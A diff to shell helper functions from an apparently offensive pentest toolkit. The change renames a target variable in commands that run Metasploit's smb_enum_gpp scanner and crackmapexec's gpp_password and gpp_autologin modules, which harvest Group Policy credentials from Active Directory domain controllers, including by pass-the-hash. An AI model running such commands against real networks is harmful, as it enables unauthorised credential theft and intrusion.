@@ -29,7 +29,7 @@ nb-ad-gpp-msf() {
     __check-project
 	  __check-domain
 	  __ask "Enter the IP address of the target DC server"
-	  nb-vars-set-rhost
+	  nb-vars-set-dchost
     __ask "Enter a user account"
     nb-vars-set-user
     __ask "Enter a password for authentication"
@@ -40,7 +40,7 @@ nb-ad-gpp-msf() {
     rc_file="/tmp/msf_smb_enum_gpp_$rand.rc"
 
     echo "use auxiliary/scanner/smb/smb_enum_gpp" > "$rc_file"
-    echo "set RHOST ${__RHOST}" >> "$rc_file"
+    echo "set RHOST ${__DCHOST}" >> "$rc_file"
     echo "set SMBUser ${__USER}" >> "$rc_file"
     echo "set SMBPass ${__PASS}" >> "$rc_file"
     echo "set SMBDomain ${__DOMAIN}" >> "$rc_file"
@@ -52,7 +52,7 @@ nb-ad-gpp-msf() {
 nb-ad-gpp-cme-password() {
     __check-project
     __ask "Enter RHOST of the target DC server"
-    nb-vars-set-rhost
+    nb-vars-set-dchost
 	  __check-user
     __check-domain
     echo
@@ -64,12 +64,12 @@ nb-ad-gpp-cme-password() {
         echo
         __ask "Enter a password for authentication"
         __check-pass
-        print -z "crackmapexec smb ${__RHOST} -u ${__USER} -d ${__DOMAIN} -p ${__PASS} -M gpp_password | tee $(__netpath)/cme-GPP-password.txt"
+        print -z "crackmapexec smb ${__DCHOST} -u ${__USER} -d ${__DOMAIN} -p ${__PASS} -M gpp_password | tee $(__netpath)/cme-GPP-password.txt"
     elif [[ $login == "h" ]]; then
         echo
         __ask "Enter the NT:LM hash for authentication"
         __check-hash
-        print -z "crackmapexec smb ${__RHOST} -u ${__USER} -H ${__HASH} --local-auth -M gpp_password | tee $(__netpath)/cme-GPP-password.txt"
+        print -z "crackmapexec smb ${__DCHOST} -u ${__USER} -H ${__HASH} --local-auth -M gpp_password | tee $(__netpath)/cme-GPP-password.txt"
     else
         echo
         __err "Invalid option. Please choose 'p' for password or 'h' for hash."
@@ -79,7 +79,7 @@ nb-ad-gpp-cme-password() {
 nb-ad-gpp-cme-autologin() {
     __check-project
     __ask "Enter RHOST of the target DC server"
-    nb-vars-set-rhost
+    nb-vars-set-dchost
 	  __check-user
     __check-domain
     echo
@@ -91,12 +91,12 @@ nb-ad-gpp-cme-autologin() {
         echo
         __ask "Enter a password for authentication"
         __check-pass
-        print -z "crackmapexec smb ${__RHOST} -u ${__USER} -d ${__DOMAIN} -p ${__PASS} -M gpp_autologin | tee $(__netpath)/cme-GPP-autologin.txt"
+        print -z "crackmapexec smb ${__DCHOST} -u ${__USER} -d ${__DOMAIN} -p ${__PASS} -M gpp_autologin | tee $(__netpath)/cme-GPP-autologin.txt"
     elif [[ $login == "h" ]]; then
         echo
         __ask "Enter the NT:LM hash for authentication"
         __check-hash
-        print -z "crackmapexec smb ${__RHOST} -u ${__USER} -H ${__HASH} --local-auth -M gpp_autologin | tee $(__netpath)/cme-GPP-autologin.txt"
+        print -z "crackmapexec smb ${__DCHOST} -u ${__USER} -H ${__HASH} --local-auth -M gpp_autologin | tee $(__netpath)/cme-GPP-autologin.txt"
     else
         echo
         __err "Invalid option. Please choose 'p' for password or 'h' for hash."
